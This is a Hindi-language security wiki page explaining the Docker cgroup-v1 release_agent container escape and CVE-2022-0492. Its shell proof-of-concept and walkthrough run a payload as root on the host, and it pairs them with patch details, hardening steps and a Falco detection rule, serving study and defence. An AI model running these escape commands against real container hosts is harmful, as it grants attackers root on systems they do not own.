# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**अधिक जानकारी के लिए, कृपया** [**मूल ब्लॉग पोस्ट**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)** को देखें।** यह केवल एक सारांश है:

---

## Classic PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
The PoC **cgroup-v1** `release_agent` फीचर का दुरुपयोग करता है: जब एक cgroup का अंतिम कार्य जो `notify_on_release=1` है, समाप्त होता है, तो कर्नेल (होस्ट पर **प्रारंभिक नामस्थान में**) उस प्रोग्राम को निष्पादित करता है जिसका पथ नाम लिखने योग्य फ़ाइल `release_agent` में संग्रहीत होता है। क्योंकि वह निष्पादन **होस्ट पर पूर्ण रूट विशेषाधिकार के साथ** होता है, फ़ाइल तक लिखने की पहुंच प्राप्त करना एक कंटेनर से बाहर निकलने के लिए पर्याप्त है।

### संक्षिप्त, पठनीय वॉक-थ्रू

1. **एक नया cgroup तैयार करें**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # या –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **`release_agent` को होस्ट पर हमलावर-नियंत्रित स्क्रिप्ट की ओर इंगित करें**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **पेलोड छोड़ें**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **नोटिफायर को ट्रिगर करें**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # खुद को जोड़ें और तुरंत बाहर निकलें
cat /output                                  # अब होस्ट प्रक्रियाएँ शामिल हैं
```

---

## 2022 कर्नेल भेद्यता – CVE-2022-0492

फरवरी 2022 में यिकी सुन और केविन वांग ने खोजा कि **कर्नेल ने cgroup-v1 में `release_agent` पर प्रक्रिया द्वारा लिखे जाने पर क्षमताओं की पुष्टि *नहीं* की** (कार्य `cgroup_release_agent_write`)।

प्रभावी रूप से **कोई भी प्रक्रिया जो cgroup पदानुक्रम को माउंट कर सकती थी (जैसे `unshare -UrC` के माध्यम से) वह *प्रारंभिक* उपयोगकर्ता नामस्थान में `CAP_SYS_ADMIN` के बिना `release_agent` पर एक मनमाना पथ लिख सकती थी**। एक डिफ़ॉल्ट-कॉन्फ़िगर, रूट-चलाने वाले Docker/Kubernetes कंटेनर पर इससे अनुमति बढ़ाने की अनुमति मिली:

* होस्ट पर रूट तक विशेषाधिकार वृद्धि; ↗
* कंटेनर को बिना विशेषाधिकार के बाहर निकलना।

इस दोष को **CVE-2022-0492** (CVSS 7.8 / उच्च) सौंपा गया और निम्नलिखित कर्नेल रिलीज़ (और सभी बाद के) में ठीक किया गया:

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299।

पैच कमिट: `1e85af15da28 "cgroup: Fix permission checking"`।

### कंटेनर के अंदर न्यूनतम शोषण
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
यदि कर्नेल कमजोर है तो *होस्ट* से busybox बाइनरी पूर्ण रूट के साथ निष्पादित होती है।

### हार्डनिंग और शमन

* **कर्नेल को अपडेट करें** (≥ संस्करण ऊपर)। पैच अब `release_agent` पर लिखने के लिए *प्रारंभिक* उपयोगकर्ता नामस्थान में `CAP_SYS_ADMIN` की आवश्यकता है।
* **cgroup-v2 को प्राथमिकता दें** – एकीकृत पदानुक्रम **`release_agent` सुविधा को पूरी तरह से हटा दिया गया है**, इस प्रकार के भागने को समाप्त कर दिया गया है।
* **उन होस्ट पर अव्यवस्थित उपयोगकर्ता नामस्थान को अक्षम करें** जिन्हें उनकी आवश्यकता नहीं है:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **अनिवार्य पहुंच नियंत्रण**: AppArmor/SELinux नीतियां जो `/sys/fs/cgroup/**/release_agent` पर `mount`, `openat` को अस्वीकार करती हैं, या `CAP_SYS_ADMIN` को गिराती हैं, कमजोर कर्नेल पर भी तकनीक को रोक देती हैं।
* **पढ़ने के लिए केवल बाइंड-मास्क** सभी `release_agent` फ़ाइलें (Palo Alto स्क्रिप्ट उदाहरण):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## रनटाइम पर पहचान

[`Falco`](https://falco.org/) v0.32 से एक अंतर्निहित नियम के साथ आता है:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
नियम किसी भी लेखन प्रयास पर ट्रिगर होता है `*/release_agent` से एक प्रक्रिया के अंदर एक कंटेनर में जो अभी भी `CAP_SYS_ADMIN` रखता है।

## संदर्भ

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – विस्तृत विश्लेषण और शमन स्क्रिप्ट।
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
